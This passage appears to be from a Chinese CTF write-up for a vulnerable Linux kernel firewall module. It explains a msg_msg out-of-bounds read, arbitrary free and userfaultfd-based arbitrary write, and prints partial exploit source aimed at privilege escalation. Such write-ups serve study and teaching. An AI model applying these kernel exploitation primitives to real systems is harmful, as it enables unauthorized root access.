seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过这道题目的作者的研究，依旧发现了一个只利用msg进行任意写的思路，看完后不得不说一句好牛😻。</p>
<p>在简单模式中，其实忽略一个msg的利用方式，那就是任意free,在msgrev()中会把找到的msg以及对应的段都给free掉，然后把这个msg从<code>msg_queue</code>中脱链，所以如果能控制<code>msg</code>的话可以控制next让其指向一个object地址，然后再<code>msgrcv()</code>,如果伪造next合理的话，就会把next给free掉了，这就构成了任意地址free的效果。</p>
<p>在小于0x1000尺寸的object的msg利用中，就是先进行任意free,然后通过任意free构造出任意地址写，具体思路如下</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p><strong>1</strong>.首先操作如下，申请三个msg_id,然后向msg_id[0]申请一个0x40大小的msg,这个msg是可以控制的，向msg_id[1]申请两个msg，第一个大小是0x40,第二个大小是0x2000。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1fc8</span>,IPC_NOWAIT);</span><br></pre></td></tr></table></figure>

<p>然后0x40的slab上可能出现的情况如图，改大上面的msg的<code>m_ts</code>就可以越界读了，最主要的是读到msg_id[1]的0x40的msg的ll_prev,ll_next,其中ll_prev指向了msg_id[1]的msg_queue,ll_next指向了msg_id[1]的下一个0x2000的msg，然后还可以根据这个越界读泄露内核地址，但是这个内核地址的选择不能被fg_kaslr影响，我选择的是<code>error_injection_list</code>这个指向内核数据段的地址算出kernelbase。</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/1.png" alt="debug"></p>
<p> <strong>2</strong>.再利用msg_id[0]的msg进行任意读，读取当前进程的<code>task_struct</code>，这个和简单模式一样就不赘述。</p>
<p><strong>3</strong>.构造任意free,首先把msg_id[1]的所有msg全部释放，由于这个内核是slab分配，且slab是后进先出的，在释放0x2000的msg的时候首先释放msg_msg,然后再释放他的段，所以当再使用msg_id[2]申请一个0x2000的msg的时候，之前的段就被当成msg_msg,原先的msg_msg就被当成段了，再加上如果申请这个msg的时候msgsnd传入的是一个userfault检测的页，此时再让msg_id[0]的msg的next指向这个段再释放这个msg,就会把刚才申请的段给释放掉，图示如下</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/5.png" alt="debug"></p>
<p>再释放</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/9.png" alt="debug"></p>
<p>此时就相当于任意free了，但是free的是个正在初始化的msg的段，我们随时可以向这个被free的段里写入数据。</p>
<p><strong>4</strong>.任意写，此时msg_id[2]的msg.next指向被free的4K页，且能随时向这个页面里写入数据，所以可以再申请一个0x1000-0x30+0x10的msg把这个页再申请出来当新的msg的msg_msg，申请这个页的时候传入的用户态的内存也是被userfault检测的。</p>
<p>到这里就有两个come_from_user()被卡主了，如图所示，我们先让红色的msg通过，这样就能修改蓝色的msg_msg了，修改这个msg_msg的next为任意地址，然后再让蓝色的msg通过，这样在初始化这个msg的段的时候就会向任意地址写任意内容了。</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/10.png" alt="debug"></p>
<p>感觉自己讲的很坨屎一样。。。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>思路比较饶，但总结来看最后实现任意地址写还是通过控制一个4K大小的msg_msg来完成的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_size 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;user_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> msg_id[<span class="number">3</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> <span class="built_in">queue</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernelbase=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_task=<span class="number">0</span>,prev_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">pthread_t</span> td[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> is_write_msg=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;31m %s\e[0m\n&quot;</span>,err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%d.%d.%d.%d\n&quot;,(ip&amp;0xff),(ip&amp;0x0000ff00)&gt;&gt;8,(ip&amp;0x00ff0000)&gt;&gt;16,(ip&amp;0xff000000)&gt;&gt;24);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;add fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span 